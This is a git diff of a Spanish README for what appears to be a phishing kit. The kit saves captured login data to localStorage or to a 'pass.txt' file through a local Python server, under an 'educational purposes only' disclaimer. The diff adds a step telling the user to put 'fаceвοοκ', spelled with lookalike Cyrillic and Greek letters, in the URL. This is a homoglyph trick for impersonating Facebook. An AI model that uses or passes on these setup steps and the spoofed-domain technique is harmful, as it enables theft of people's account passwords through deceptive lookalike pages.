@@ -42,11 +42,12 @@ Este proyecto es solo para fines educativos y de investigación en seguridad. NO
 ### Opción 1: Modo Local (Solo Descarga)
 1. Abrir `index.html` en un navegador
 2. Los datos se guardan en localStorage y se descargan como archivo
-
+3. fаceвοοκ de nombre  en el url
 ### Opción 2: Modo Servidor (Guarda en pass.txt)
 1. Ejecutar el servidor Python:
    ```bash
    python server.py
+   
    ```
 2. Abrir http://localhost:8000 en el navegador
 3. Cambiar en `index.html` la línea:
